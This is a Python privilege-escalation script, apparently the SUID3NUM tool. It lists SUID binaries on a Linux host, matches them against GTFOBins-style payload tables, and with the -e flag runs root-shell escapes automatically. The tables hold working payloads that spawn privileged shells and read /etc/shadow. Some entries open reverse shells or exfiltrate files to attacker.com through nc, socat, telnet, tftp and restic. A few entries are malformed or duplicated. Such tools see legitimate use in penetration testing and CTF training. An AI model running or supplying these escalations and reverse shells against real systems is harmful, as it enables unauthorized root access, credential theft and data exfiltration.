#!/usr/bin/python3

"""
Works with both python2 & python3
"""

from sys import argv
from os import system, popen
from time import sleep

# The following list contains exploits for all known SUID binaries
customSUIDs = {
    'aa-exec': './aa-exec /bin/sh -p',
    'ab': 'URL=http://attacker.com/\nLFILE=file_to_send',
    'agetty': './agetty -o -p -l /bin/sh -a root tty',
    'alpine': 'LFILE=file_to_read\n./alpine -F "$LFILE"',
    'ar': 'TF=$(mktemp -u)\nLFILE=file_to_read\n./ar r "$TF" "$LFILE"',
    'aria2c': 'COMMAND=\'id\'\nTF=$(mktemp)\necho "$COMMAND" > $TF\nchmod +x $TF\n./aria2c --on-download-error=$TF http://x',
    'arj': 'TF=$(mktemp -d)\nLFILE=file_to_write',
    'arp': 'LFILE=file_to_read\n./arp -v -f "$LFILE"',
    'as': 'LFILE=file_to_read\n./as @$LFILE',
    'ascii-xfr': 'LFILE=file_to_read\n./ascii-xfr -ns "$LFILE"',
    'aspell': 'LFILE=file_to_read\n./aspell -c "$LFILE"',
    'atobm': """LFILE=file_to_read\n./atobm $LFILE 2>&1 | awk -F "'" '{printf "%s", $2}'""",
    'awk': './awk \'BEGIN {system("/bin/sh")}\'',
    'base32': 'LFILE=file_to_read\nbase32 "$LFILE" | base32 --decode',
    'base64': 'LFILE=file_to_read\n./base64 "$LFILE" | base64 --decode',
    'basenc': 'LFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64',
    'basez': 'LFILE=file_to_read\n./basez "$LFILE" | basez --decode',
    'batcat': './batcat --paging always /etc/profile\n!/bin/sh',
    'bc': 'LFILE=file_to_read\n./bc -s $LFILE\nquit',
    'bridge': 'LFILE=file_to_read\n./bridge -b "$LFILE"',
    'busctl': """./busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'""",
    'byebug': 'TF=$(mktemp)\necho \'system("/bin/sh")\' > $TF\n./byebug $TF\ncontinue',
    'bzip2': 'LFILE=file_to_read\n./bzip2 -c $LFILE | bzip2 -d',
    'capsh': './capsh --gid=0 --uid=0 --',
    'choom': './choom -n 0 -- /bin/sh -p',
    'chmod': 'LFILE=file_to_change\n./chmod 0777 $LFILE',
    'chown': 'LFILE=file_to_change\n./chown $(id -un):$(id -gn) $LFILE',
    'clamscan': """LFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\n./clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'""",
    'cmp': 'LFILE=file_to_read\n./cmp $LFILE /dev/zero -b -l',
    'cp': 'LFILE=file_to_write\nTF=$(mktemp)\necho "DATA" > $TF\n./cp $TF $LFILE',
    'column': 'LFILE=file_to_read\n./column $LFILE',
    'comm': 'LFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null',
    'composer': """TF=$(mktemp -d)\necho '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json\n./composer --working-dir=$TF run-script x""",
    'cpio': '[READ FILE] LFILE=file_to_read\nTF=$(mktemp -d)\necho "$LFILE" | ./cpio -R $UID -dp $TF\ncat "$TF/$LFILE"\n[WRITE FILE]\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | ./cpio -R 0:0 -p $LDIR',
    'cpulimit': './cpulimit -l 100 -f -- /bin/sh -p',
    'csplit': 'LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01',
    'csvtool': 'LFILE=file_to_read\n./csvtool trim t $LFILE',
    'cupsfilter': 'LFILE=file_to_read\n./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE',
    'curl': 'URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE',
    'date': 'LFILE=file_to_read\n./date -f $LFILE',
    'dc': """./dc -e '!/bin/sh'""",
    'dd': 'LFILE=file_to_write\necho "data" | ./dd of=$LFILE',
    'debugfs': './debugfs\n!/bin/sh',
    'dialog': 'LFILE=file_to_read\n./dialog --textbox "$LFILE" 0 0',
    'diff': 'LFILE=file_to_read\n./diff --line-format=%L /dev/null $LFILE',
    'dig': 'LFILE=file_to_read\n./dig -f $LFILE',
    'distcc': './distcc /bin/sh -p',
    'dmsetup': "./dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\n./dmsetup ls --exec '/bin/sh -p -s'", 'file': 'LFILE=file_to_read\n./file -m $LFILE',
    'dosbox': """LFILE='\path\to\file_to_write'\n./dosbox -c 'mount c /' -c "echo DATA >c:$LFILE" -c exit""",
    'dvips': """tex '\special{psfile="`/bin/sh 1>&0"}\end'""",
    'ed': './ed\n!/bin/sh',
    'efax': 'LFILE=file_to_read\n./efax -d "$LFILE"',
    'elvish': './elvish',
    'eqn': 'LFILE=file_to_read\n./eqn "$LFILE"',
    'espeak': 'LFILE=file_to_read\n./espeak -qXf "$LFILE"',
    'fish': './fish',
    'fmt': 'LFILE=file_to_read\n./fmt -pNON_EXISTING_PREFIX "$LFILE"',
    'gcore': './gcore $PID',
    'genie': """./genie -c '/bin/sh'""",
    'genisoimage': 'LFILE=file_to_read\n./genisoimage -sort "$LFILE"',
    'ginsh': './ginsh\n!/bin/sh',
    'git': 'PAGER=\'sh -c "exec sh 0<&1"\' ./git -p help',
    'gtester': 'TF=$(mktemp)\necho \'#!/bin/sh -p\' > $TF\necho \'exec /bin/sh -p 0<&1\' >> $TF\nchmod +x $TF\ngtester -q $TF',
    'gzip': 'LFILE=file_to_read\n./gzip -f $LFILE -t',
    'hd': 'LFILE=file_to_read\n./hd "$LFILE"',
    'hexdump': 'LFILE=file_to_read\n./hexdump -C "$LFILE"',
    'highlight': 'LFILE=file_to_read\n./highlight --no-doc --failsafe "$LFILE"',
    'hping3': './hping3\n/bin/sh -p',
    'iconv': 'LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 "$LFILE"',
    'iftop': './iftop\n!/bin/sh',
    'install': 'LFILE=file_to_change\nTF=$(mktemp)\n./install -m 6777 $LFILE $TF',
    'ip': 'LFILE=file_to_read\n./ip -force -batch "$LFILE"',
    'ispell': './ispell /etc/passwd\n!/bin/sh -p',
    'jjs': 'echo "Java.type(\'java.lang.Runtime\').getRuntime().exec(\'/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)\').waitFor()" | ./jjs',
    'join': 'LFILE=file_to_read\n./join -a 2 /dev/null $LFILE',
    'julia': """./julia -e 'run(`/bin/sh -p`)'""",
    'joe': './joe\n^K!/bin/sh',
    'jq': 'LFILE=file_to_read\n./jq -Rr . "$LFILE"',
    'ksshell': 'LFILE=file_to_read\n./ksshell -i $LFILE',
    'kubectl': 'LFILE=dir_to_serve\n./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/',
    'latex': """./latex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'""",
    'ldconfig': 'TF=$(mktemp -d)\necho "$TF" > "$TF/conf"\n# move malicious libraries in $TF\n./ldconfig -f "$TF/conf"',
    'lftp': """./lftp -c '!/bin/sh'""",
    'links': 'LFILE=file_to_read\n./links "$LFILE"',
    'look': 'LFILE=file_to_read\n./look \'\' "$LFILE"',
    'lualatex': """./lualatex -shell-escape '\documentclass{article}\begin{document}\directlua{os.execute("/bin/sh")}\end{document}'""",
    'lwp-download': 'URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./lwp-download $URL $LFILE',
    'lwp-request': 'LFILE=file_to_read\n./lwp-request "file://$LFILE"',
    'minicom': './minicom -D /dev/null',
    'mosquitto': 'LFILE=file_to_read\n./mosquitto -c "$LFILE"',
    'msgattrib': 'LFILE=file_to_read\n./msgattrib -P $LFILE',
    'msgcat': 'LFILE=file_to_read\n./msgcat -P $LFILE',
    'msgconv': 'LFILE=file_to_read\n./msgconv -P $LFILE',
    'msgfilter': """echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'""",
    'msgmerge': 'LFILE=file_to_read\n./msgmerge -P $LFILE /dev/null',
    'multitime': './multitime /bin/sh -p',
    'mv': 'LFILE=file_to_write\nTF=$(mktemp)\necho "DATA" > $TF\n./mv $TF $LFILE',
    'mysql': "./mysql -e '\\! /bin/sh'",
    'nano': './nano -s /bin/sh\n/bin/sh\n^T',
    'nasm': 'LFILE=file_to_read\n./nasm -@ $LFILE',
    'nawk': './nawk \'BEGIN {system("/bin/sh")}\'',
    'nc': 'RHOST=attacker.com\nRPORT=12345\n./nc -e /bin/sh $RHOST $RPORT',
    'ncdu': './ncdu\nb',
    'ncftp': './ncftp\n!/bin/sh -p',
    'nft': 'LFILE=file_to_read\n./nft -f "$LFILE"',
    'nm': 'LFILE=file_to_read\n./nm @$LFILE',
    'nmap': 'TF=$(mktemp)\necho \'os.execute("/bin/sh")\' > $TF\n./nmap --script=$TF',
    'nohup': 'nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"',
    'ntpdate': 'LFILE=file_to_read\n./ntpdate -a x -k $LFILE -d localhost',
    'octave': """./octave-cli --eval 'system("/bin/sh")'""",
    'openssl': 'openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n',
    'openvpn': """./openvpn --dev null --script-security 2 --up '/bin/sh -p -c "sh -p"'""",
    'pandoc': 'LFILE=file_to_write\necho DATA | ./pandoc -t plain -o "$LFILE"',
    'paste': 'LFILE=file_to_read\npaste $LFILE',
    'pdflatex': """./pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'""",
    'pdftex': """./pdftex --shell-escape '\write18{/bin/sh}\end'""",
    'perf': './perf stat /bin/sh -p',
    'pexec': './pexec /bin/sh -p',
    'pic': './pic -U\n.PS\nsh X sh X',
    'pico': './pico -s /bin/sh\n/bin/sh\n^T',
    'pidstat': 'COMMAND=id\n./pidstat -e $COMMAND',
    'posh': './posh',
    'pr': 'LFILE=file_to_read\npr -T $LFILE',
    'pry': './pry\nsystem("/bin/sh")',
    'psftp': 'sudo psftp\n!/bin/sh',
    'ptx': 'LFILE=file_to_read\n./ptx -w 5000 "$LFILE"',
    'rake': """./rake -p '`/bin/sh 1>&0`'""",
    'rc': './rc -c "/bin/sh -p"',
    'readelf': 'LFILE=file_to_read\n./readelf -a @$LFILE',
    'restic': 'RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\n./restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"',
    'rev': 'LFILE=file_to_read\n./rev $LFILE | rev',
    'rpm': """./rpm --eval '%{lua:os.execute("/bin/sh")}'""",
    'rpmdb': """./rpmdb --eval '%(/bin/sh 1>&2)'""",
    'rpmquery': """./rpmquery --eval '%{lua:os.execute("/bin/sh")}'""",
    'rtorrent': 'echo "execute = /bin/sh,-p,-c,\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\"" >~/.rtorrent.rc\n./rtorrent',
    'runscript': """TF=$(mktemp)\necho '! exec /bin/sh' >$TF\n./runscript $TF""",
    'rview': """./rview -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'\nOR\n./rview -c ':lua os.execute("reset; exec sh")'""",
    'sash': './sash',
    'scanmem': './scanmem\nshell /bin/sh',
    'scp': 'TF=$(mktemp)\necho \'sh 0<&2 1>&2\' > $TF\nchmod +x "$TF"\n./scp -S $TF a b:',
    'scrot': './scrot -e /bin/sh',
    'setfacl': 'LFILE=file_to_change\nUSER=somebody\n./setfacl -m u:$USER:rwx $LFILE',
    'setlock': './setlock - /bin/sh -p',
    'shuf': 'LFILE=file_to_write\n./shuf -e DATA -o "$LFILE"\nsudo:',
    'slsh': """./slsh -e 'system("/bin/sh")'""",
    'socat': 'RHOST=attacker.com\nRPORT=12345\n./socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane',
    'soelim': 'LFILE=file_to_read\n./soelim "$LFILE"',
    'softlimit': './softlimit /bin/sh -p',
    'sqlite3': "./sqlite3 /dev/null '.shell /bin/sh'", 'socat': 'RHOST=attacker.com\nRPORT=12345\n./socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane',
    'ss': 'LFILE=file_to_read\n./ss -a -F $LFILE',
    'ssh-agent': './ssh-agent /bin/ -p',
    'ssh-keygen': './ssh-keygen -D ./lib.so',
    'sshpass': './sshpass /bin/sh -p',
    'strings': 'LFILE=file_to_read\n./strings "$LFILE"',
    'sysctl': 'LFILE=file_to_read\n./sysctl -n "/../../$LFILE"',
    'systemctl': 'TF=$(mktemp).service\necho \'[Service]\nType=oneshot\nExecStart=/bin/sh -c "id > /tmp/output"\n[Install]\nWantedBy=multi-user.target\' > $TF\n./systemctl link $TF\n./systemctl enable --now $TF',
    'tac': 'LFILE=file_to_read\n./tac -s \'PromiseWontOverWrite\' "$LFILE"',
    'tar': './tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh',
    'tasksh': './tasksh\n!/bin/sh',
    'tbl': 'LFILE=file_to_read\n./tbl $LFILE',
    'tdbtool': './tdbtool\n! /bin/sh',
    'tee': 'LFILE=file_to_write\necho DATA | ./tee -a "$LFILE"',
    'telnet': 'RHOST=attacker.com\nRPORT=12345\n./telnet $RHOST $RPORT\n^]\n!/bin/sh',
    'terraform': './terraform console\nfile("file_to_read")',
    'tex': """./tex --shell-escape '\write18{/bin/sh}\end'""",
    'tic': 'LFILE=file_to_read\n./tic -C "$LFILE"',
    'tmate': './tmate -c /bin/sh',
    'tftp': 'RHOST=attacker.com\n./tftp $RHOST\nput file_to_send',
    'troff': 'LFILE=file_to_read\n./troff $LFILE',
    'unsquashfs': './unsquashfs shell\n./squashfs-root/sh -p',
    'uudecode': 'LFILE=file_to_read\nuuencode "$LFILE" /dev/stdout | uudecode',
    'uuencode': 'LFILE=file_to_read\nuuencode "$LFILE" /dev/stdout | uudecode',
    'unzip': './unzip -K shell.zip\n./sh -p',
    'update-alternatives': """LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\n./update-alternatives --force --install "$LFILE" x "$TF" 0""",
    'vagrant': """cd $(mktemp -d)\necho 'exec "/bin/sh -p"' > Vagrantfile\nvagrant up""",
    'varnishncsa': """LFILE=file_to_write\n./varnishncsa -g request -q 'ReqURL ~ "/xxx"' -F '%{yyy}i' -w "$LFILE""",
    'view': """./view -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p\nOR\n./view -c ':lua os.execute("reset; exec sh")'""",
    'vigr': './vigr',
    'vimdiff': """./vimdiff -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'\nOR\n./vimdiff -c ':lua os.execute("reset; exec sh")'""",
    'vipw': './vipw',
    'w3m': 'LFILE=file_to_read\n./w3m "$LFILE" -dump',
    'whiptail': 'LFILE=file_to_read\n./whiptail --textbox --scrolltext "$LFILE" 0 0',
    'xdotool': './xdotool exec --sync /bin/sh -p',
    'xmodmap': 'LFILE=file_to_read\n./xmodmap -v $LFILE',
    'xmore': 'LFILE=file_to_read\n./xmore $LFILE',
    'xelatex': """./xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'""",
    'xetex': """./xetex --shell-escape '\write18{/bin/sh}\end'""",
    'xz': 'LFILE=file_to_read\n./xz -c "$LFILE" | xz -d',
    'yash': './yash',
    'wget': 'export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\n./wget $URL -O $LFILE',
    'zip': "TF=$(mktemp -u)\n./zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF",
    'zsh': './zsh',
    'zsoelim': 'LFILE=file_to_read\n./zsoelim "$LFILE"',
}

# The following list contains all default SUID bins found within Unix
defSUIDBinaries = [
    "arping",
    "at",
    "bwrap",
    "chfn",
    "chrome-sandbox",
    "chsh",
    "dbus-daemon-launch-helper",
    "dmcrypt-get-device",
    "exim4",
    "fusermount",
    "gpasswd",
    "helper",
    "kismet_capture",
    "lxc-user-nic",
    "mount",
    "mount.cifs",
    "mount.ecryptfs_private",
    "mount.nfs",
    "newgidmap",
    "newgrp",
    "newuidmap",
    "ntfs-3g",
    "passwd",
    "ping",
    "ping6",
    "pkexec",
    "polkit-agent-helper-1",
    "pppd",
    "snap-confine",
    "ssh-keysign",
    "su",
    "sudo",
    "traceroute6.iputils",
    "ubuntu-core-launcher",
    "umount",
    "VBoxHeadless",
    "VBoxNetAdpCtl",
    "VBoxNetDHCP",
    "VBoxNetNAT",
    "VBoxSDL",
    "VBoxVolInfo",
    "VirtualBoxVM",
    "vmware-authd",
    "vmware-user-suid-wrapper",
    "vmware-vmx",
    "vmware-vmx-debug",
    "vmware-vmx-stats",
    "Xorg.wrap",
]


# Auto Exploitation of SUID Bins - List
suidExploitation = {
    'ash': '',
    'bash': '-p',
    'busybox': 'sh',
    'cat': '/etc/shadow',
    'chroot': '/ /bin/sh -p',
    'csh': '-b',
    'cut': '-d "" -f1 /etc/shadow',
    'dash': '-p',
    'docker': 'run -v /:/mnt --rm -it alpine chroot /mnt sh',
    'emacs': '-Q -nw --eval \'(term "/bin/sh -p")\'',
    'env': '/bin/sh -p',
    'expand': '/etc/shadow',
    'expect': '-c "spawn /bin/sh -p;interact"',
    'find': '. -exec /bin/sh -p \\; -quit',
    'flock': '-u / /bin/sh -p',
    'fold': '-w99999999 /etc/shadow',
    'gawk': '\'BEGIN {system("/bin/sh")}\'',
    'gdb': '-q -nx -ex \'python import os; os.execl("/bin/sh", "sh", "-p")\' -ex quit',
    'gimp': '-idf --batch-interpreter=python-fu-eval -b \'import os; os.execl("/bin/sh", "sh", "-p")\'',
    'grep': '"" /etc/shadow',
    'head': '-c2G /etc/shadow',
    'ionice': '/bin/sh -p',
    'jrunscript': '-e "exec(\'/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)\')"',
    'ksh': '-p',
    'ld.so': '/bin/sh -p',
    'less': '/etc/shadow',
    'logsave': '/dev/null /bin/sh -i -p',
    'lua': '-e \'os.execute("/bin/sh")\'',
    'make': '-s --eval=$\'x:\\n\\t-\'"/bin/sh -p"',
    'mawk': '\'BEGIN {system("/bin/sh")}\'',
    'more': '/etc/shadow',
    'nice': '/bin/sh -p',
    'nl': '-bn -w1 -s \'\' /etc/shadow',
    'node': 'node -e \'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]});\'',
    'od': 'od -An -c -w9999 /etc/shadow | sed -E -e \'s/ //g\' -e \'s/\\\\n/\\n/g\'',
    'perl': '-e \'exec "/bin/sh";\'',
    'pg': '/etc/shadow',
    'php': '-r "pcntl_exec(\'/bin/sh\', [\'-p\']);"',
    'python': '-c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
    'rlwrap': '-H /dev/null /bin/sh -p',
    'rpm': '--eval \'%{lua:os.execute("/bin/sh", "-p")}\'',
    'rpmquery': '--eval \'%{lua:posix.exec("/bin/sh", "-p")}\'',
    'rsync': '-e \'sh -p -c "sh 0<&2 1>&2"\' 127.0.0.1:/dev/null',
    'run-parts': '--new-session --regex \'^sh$\' /bin --arg=\'-p\'',
    'rvim': '-c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
    'sed': '-e "" /etc/shadow',
    'setarch': '$(arch) /bin/sh -p',
    'sh': '-p',
    'sort': '-m /etc/shadow',
    'start-stop-daemon': '-n $RANDOM -S -x /bin/sh -- -p',
    'stdbuf': '-i0 /bin/sh -p',
    'strace': '-o /dev/null /bin/sh -p',
    'tail': '-c2G /etc/shadow',
    'taskset': '1 /bin/sh -p',
    'time': '/bin/sh -p',
    'timeout': '7d /bin/sh -p',
    'ul': '/etc/shadow',
    'unexpand': 'unexpand -t99999999 /etc/shadow',
    'uniq': '/etc/shadow',
    'unshare': '-r /bin/sh',
    'vim': '-c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
    'watch': '-x sh -c \'reset; exec sh 1>&0 2>&0\'',
    'xargs': '-a /dev/null sh -p',
    'xxd': '/etc/shadow | xxd -r',
    'zsh': '',
}


# The following list contains GTFO Bins binaries which are SUID exploitable
gtfoBinsSuidsList = [
    "aa-exec",
    "ab",
    "agetty",
    "alpine",
    "ar",
    "arj",
    "arp",
    "as",
    "ascii-xfr",
    "ash",
    "aspell",
    "atobm",
    "awk",
    "base32",
    "base64",
    "basenc",
    "basez",
    "bash",
    "bc",
    "bridge",
    "busctl",
    "busybox",
    "bzip2",
    "cabal",
    "capsh",
    "cat",
    "chmod",
    "choom",
    "chown",
    "chroot",
    "clamscan",
    "cmp",
    "column",
    "comm",
    "cp",
    "cpio",
    "cpulimit",
    "csh",
    "csplit",
    "csvtool",
    "cupsfilter",
    "curl",
    "cut",
    "dash",
    "date",
    "dd",
    "debugfs",
    "dialog",
    "diff",
    "dig",
    "distcc",
    "dmsetup",
    "docker",
    "dosbox",
    "ed",
    "efax",
    "elvish",
    "emacs",
    "env",
    "eqn",
    "espeak",
    "expand",
    "expect",
    "file",
    "find",
    "fish",
    "flock",
    "fmt",
    "fold",
    "gawk",
    "gcore",
    "genie",
    "genisoimage",
    "gimp",
    "gdb",
    "grep",
    "gtester",
    "gzip",
    "hd",
    "head",
    "hexdump",
    "highlight",
    "hping3",
    "iconv",
    "install",
    "ionice",
    "ip",
    "ispell",
    "jjs",
    "join",
    "jq",
    "jrunscript",
    "julia",
    "ksh",
    "ksshell",
    "kubectl",
    "ld.so",
    "less",
    "links",
    "logsave",
    "look",
    "lua",
    "make",
    "mawk",
    "minicom",
    "more",
    "mosquitto",
    "msgattrib",
    "msgcat",
    "msgconv",
    "msgfilter",
    "msgmerge",
    "msguniq",
    "multitime",
    "mv",
    "nasm",
    "nawk",
    "ncftp",
    "nft",
    "nice",
    "nl",
    "nm",
    "nmap",
    "node",
    "nohup",
    "ntpdate",
    "od",
    "openssl",
    "openvpn",
    "pandoc",
    "paste",
    "perf",
    "perl",
    "pexec",
    "pg",
    "php",
    "pidstat",
    "pr",
    "ptx",
    "python",
    "rc",
    "readelf",
    "restic",
    "rev",
    "rlwrap",
    "rsync",
    "rtorrent",
    "run-parts",
    "rview",
    "rvim",
    "sash",
    "scanmem",
    "sed",
    "setarch",
    "setfacl",
    "setlock",
    "shuf",
    "soelim",
    "softlimit",
    "sort",
    "sqlite3",
    "ss",
    "ssh-agent",
    "ssh-keygen",
    "ssh-keyscan",
    "sshpass",
    "start-stop-daemon",
    "stdbuf",
    "strace",
    "strings",
    "sysctl",
    "systemctl",
    "tac",
    "tail",
    "taskset",
    "tbl",
    "tclsh",
    "tee",
    "terraform",
    "tftp,"
    "tic",
    "time",
    "timeout",
    "troff",
    "ul",
    "unexpand",
    "uniq",
    "unsquashfs",
    "unshare",
    "unzip",
    "update-alternatives",
    "uudecode",
    "uuencode",
    "vagrant",
    "varnishncsa",
    "view",
    "vigr",
    "vim",
    "vimdiff",
    "vipw",
    "w3m",
    "watch",
    "wc",
    "wget",
    "whiptail",
    "xargs",
    "xdotool",
    "xmodmap",
    "xmore",
    "xxd",
    "xz",
    "yash",
   "zsh",
]

gtfoBinsLimitedSuidsList = [
    "aria2c",
    "batcat",
    "byebug",
    "composer",
    "dc",
    "dvips",
    "ginsh",
    "git",
    "iftop",
    "joe",
    "latex",
    "ldconfig",
    "lftp",
    "lualatex",
    "luatex",
    "mysql",
    "nano",
    "nc",
    "ncdu",
    "octave",
    "pdflatex",
    "pdftex",
    "pic",
    "pico",
    "posh",
    "pry",
    "psftp",
    "rake",
    "rpm",
    "rpmdb",
    "rpmquery",
    "rpmverify",
    "runscript",
    "scp",
    "scrot",
    "slsh",
    "socat",
    "tar",
    "tasksh",
    "tdbtool",
    "telnet",
    "tex",
    "tmate",
    "xelatex",
    "xetex",
    "zip",
]


"""
Colors List
"""

CYAN    = "\033[0;96m"
GREEN   = "\033[0;92m"
WHITE   = "\033[0;97m"
RED     = "\033[0;91m"
BLUE    = "\033[0;94m"
YELLOW  = "\033[0;33m"
MAGENTA = "\033[0;35m"
RESET = "\033[0m"

BARLINE = "------------------------------"

BANNER  = MAGENTA + "  ___ _   _ _ ___    _____  _ _   _ __  __ \n"
BANNER  += YELLOW + " / __| | | / |   \\  |__ / \\| | | | |  \\/  |\n"
BANNER  += BLUE + " \\__ \\ |_| | | |) |  |_ \\ .` | |_| | |\\/| |\n"
BANNER  += RED + " |___/\\___/|_|___/  |___/_|\\_|\\___/|_|  |_| " + CYAN + " twitter@syed__umar\n"


def list_all_suid_binaries():
    """
    Find the SUID binaries and return the list
    """

    print(WHITE + "[" + BLUE + "#" + WHITE + "] " + YELLOW + "Finding/Listing all SUID Binaries ..")
    print(WHITE + BARLINE)

    command     = "find / -perm -4000 -type f 2>/dev/null"
    result      = popen(command).read().strip().split("\n")

    for bins in result:
        print(YELLOW + bins)

    print(WHITE + BARLINE + "\n\n")
    return(result)


def check_suids_in_gtfo(suid_bins):
    """
    This function prints the following data:
        - Default binaries which ship with installation of linux
        - Custom binaries which aren't part of default list
        - Binaries which match GTFObins list!

    Args:
        suid_bins ([list]): SUID binaries list

    Returns:
        bins_in_gtfo, default_suid_bins, custom_suid_bins
    """

    bins_in_gtfo      = []
    custom_suid_bins  = []
    default_suid_bins = []

    for bins in suid_bins:
        bin_name = bins.split("/")[::-1][0]

        if bin_name not in defSUIDBinaries:
            custom_suid_bins.append(bins)

            if bin_name in gtfoBinsSuidsList or bin_name in gtfoBinsLimitedSuidsList:
                bins_in_gtfo.append(bins)

        else:
            default_suid_bins.append(bins)

    print(WHITE + "["+ RED + "!" + WHITE + "] Default Binaries (Don't bother)")

    print(BARLINE)
    for bins in default_suid_bins:
        print(BLUE + bins)
    print(WHITE + BARLINE + "\n\n")

    print(WHITE + "[" + CYAN + "~" + WHITE + "] " + CYAN + "Custom SUID Binaries (Interesting Stuff)")

    print(WHITE + BARLINE)
    for bins in custom_suid_bins:
        print(CYAN + bins)
    print(WHITE + BARLINE + "\n\n")

    if len(bins_in_gtfo) != 0:
        print("[" + GREEN + "#" + WHITE + "] " + GREEN + "SUID Binaries in GTFO bins list (Hell Yeah!)")
        print(WHITE + BARLINE)

        for binaries in bins_in_gtfo:
            path_of_bin   = popen("which " + binaries).read().strip()
            if binaries in gtfoBinsSuidsList :
                gtfo_url = "https://gtfobins.github.io/gtfobins/" + binaries[::-1].split("/")[0][::-1] + "/#suid"
            else :
                gtfo_url = "https://gtfobins.github.io/gtfobins/" + binaries[::-1].split("/")[0][::-1] + "/#limited-suid"
            print(GREEN + path_of_bin + WHITE + " -~> " + MAGENTA + gtfo_url)

        print(WHITE + BARLINE + "\n\n")

    else:
        print("[" + GREEN + "#" + WHITE + "] " + GREEN + "SUID Binaries found in GTFO bins..")
        print(WHITE + BARLINE)

        print("[" + RED + "!" + WHITE + "] " + MAGENTA + "None " + RED + ":(")
        print(WHITE + BARLINE + "\n\n")


    bins_to_exploit = {}

    for binary in bins_in_gtfo:
        binary_name = binary[::-1].split("/")[0][::-1]

        if binary_name not in suidExploitation:
            bins_to_exploit[binary] = customSUIDs[binary_name]


    if len(bins_to_exploit) != 0:
        print("[" + YELLOW + "&" + WHITE + "] " + CYAN + "Manual Exploitation (Binaries which create files on the system)")
        print(WHITE + BARLINE)

        for binary_path, binary_exploitation in bins_to_exploit.items():
            binary_name             = binary_path[::-1].split("/")[0][::-1]
            binary_exploitation     = binary_exploitation.replace(binary_name, binary_path).replace("./", "")

            print(WHITE + "[" + CYAN + "&" + WHITE + "] " + MAGENTA + binary_name.capitalize() + WHITE + " ( " + GREEN + binary_path + " )" + WHITE)
            print(YELLOW + binary_exploitation + WHITE + "\n")

        print(WHITE + BARLINE + "\n\n")

    return(bins_in_gtfo, default_suid_bins, custom_suid_bins)


def exploit_enumerated_suids(bins):
    """Exploits the enumerated binaries

    Params:
        -e  -> auto-exploit

    Args:
        bins ([list]): Vulnerable SUID binaries
    """
    commands     = []

    for suid_bins in bins:
        _bin     = suid_bins.split("/")[::-1][0]

        if _bin in suidExploitation:
            _results = suid_bins + " " + suidExploitation[_bin]
            commands.append(_results)

    if len(commands) != 0:
        if len(argv) == 2:
            if argv[1] == '-e':
                print(WHITE + "[" + MAGENTA + "$" + WHITE + "] " + WHITE + "Auto Exploiting SUID bit binaries !!!")
                print(WHITE + BARLINE)

                for _commands in commands:
                    print(MAGENTA + "\n[#] Executing Command .. ")
                    print(CYAN + "[~] " + _commands + "\n" + WHITE)
                    sleep(0.5)
                    system(_commands)
                    sleep(0.5)

        else:
            print(WHITE + "[" + GREEN + "$" + WHITE + "] " + WHITE + "Please try the command(s) below to exploit harmless SUID bin(s) found !!!")
            print(WHITE + BARLINE)

            for _commands in commands:
                print("[~] " + _commands)

        print(WHITE + BARLINE + "\n\n")


def main():
    """
    1. List SUIDs
    2. Check all SUIDs enumerated in GTFO bins list
    3. Print exploitation commands
    4. Exploit those enumerated SUIDs (if user specifies: -e)
    """

    print(BANNER)

    try:
        suid_bins = list_all_suid_binaries()
        gtfo_bins = check_suids_in_gtfo(suid_bins)
        exploit_enumerated_suids(gtfo_bins[0])

    except KeyboardInterrupt:
        print("\n[" + RED + "!" + WHITE + "] " + RED + "Aye, why you do dis!?" + RESET)


if __name__ == '__main__':
    main()